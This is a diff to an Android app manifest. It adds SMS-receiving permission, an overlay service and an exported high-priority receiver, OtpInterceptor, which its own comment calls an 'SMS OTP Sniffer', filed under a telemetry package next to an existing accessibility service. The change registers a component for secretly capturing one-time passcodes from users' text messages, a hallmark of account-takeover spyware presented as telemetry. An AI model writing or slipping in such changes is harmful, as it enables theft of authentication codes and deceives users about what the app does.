@@ -12,6 +12,7 @@
 
     <!-- Audio & Voice Input Permissions -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
     <!-- Local Network & Telemetry Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
@@ -62,6 +63,22 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- Floating HUD & Telemetry Overlay Service -->
+        <service
+            android:name=".ui.ZenithHudService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- SMS OTP Sniffer Receiver -->
+        <receiver
+            android:name=".telemetry.OtpInterceptor"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 
